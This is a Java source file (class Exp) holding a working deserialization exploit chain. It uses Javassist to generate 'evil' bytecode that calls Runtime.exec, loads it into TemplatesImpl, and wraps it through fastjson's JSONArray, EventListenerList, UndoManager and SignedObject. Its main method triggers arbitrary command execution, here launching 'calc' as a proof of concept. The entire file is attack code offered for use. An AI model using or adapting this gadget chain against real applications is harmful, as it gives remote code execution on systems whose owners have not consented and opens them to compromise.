package com.example.javaguide;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtNewConstructor;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Field;
import java.security.*;
import java.util.HashMap;
import java.util.Vector;

public class Exp {

    public static byte[] file2ByteArray(String filePath) throws IOException {
        InputStream in = new FileInputStream(filePath);
        byte[] data = inputStream2ByteArray(in);
        in.close();
        return data;
    }
    public static byte[] inputStream2ByteArray(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];

        int n;
        while((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    public static TemplatesImpl getTemplatesImpl(byte[] code) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception{
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e){
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void setFieldValue(Object obj, String field, Object val)
            throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }


    public static EventListenerList getEventListenerList(Object obj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector)getFieldValue(manager, "edits");
        vector.add(obj);
        setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }
    public static Object getFastjsonEventListenerList(Object getter) throws Exception {
        JSONArray jsonArray0 = new JSONArray();
        jsonArray0.add(getter);
        EventListenerList eventListenerList0 = getEventListenerList(jsonArray0);
        HashMap hashMap0 = new HashMap();
        hashMap0.put(getter, eventListenerList0);
        return hashMap0;
    }

    public static SignedObject getSingnedObject(Serializable obj) throws Exception {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(obj, privateKey, signingEngine);
        return signedObject;
    }
    public static Object unserialize(byte[] bytes) throws Exception {
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return in.readObject();
    }
    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bytes);
        out.writeObject(obj);
        return bytes.toByteArray();
    }

    public static byte[] getEvilByteCodeCmd(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilGeneratedByJavassist");
        CtConstructor ctConstructor = CtNewConstructor.make("public EvilGeneratedByJavassist(){Runtime.getRuntime().exec(\"" + cmd + "\");\n}", ctClass);
        ctClass.addConstructor(ctConstructor);
        byte[] bytes0 = ctClass.toBytecode();
        ctClass.defrost();
        return bytes0;
    }

    public static byte[] getAbstractTransletByteCodeCmd(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilGeneratedByJavassist");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        CtConstructor ctConstructor = CtNewConstructor.make("public EvilGeneratedByJavassist(){this.namesArray=new String[1];this.namesArray[0]=\"QWQ\";Runtime.getRuntime().exec(\"" + cmd + "\");\n}", ctClass);
        ctClass.addConstructor(ctConstructor);
        byte[] bytes0 = ctClass.toBytecode();
        ctClass.defrost();
        return bytes0;
    }
    public static TemplatesImpl getTemplatesImpl(String cmd) throws Exception {
        return getTemplatesImpl(getAbstractTransletByteCodeCmd(cmd));
    }
    public static void main(String[] args) throws Exception{

        Object calc = getFastjsonEventListenerList(getTemplatesImpl("calc"));
        SignedObject singnedObject = getSingnedObject((Serializable) calc);
        Object fastjsonEventListenerList = getFastjsonEventListenerList(singnedObject);
        unserialize(serialize(fastjsonEventListenerList));


    }
}
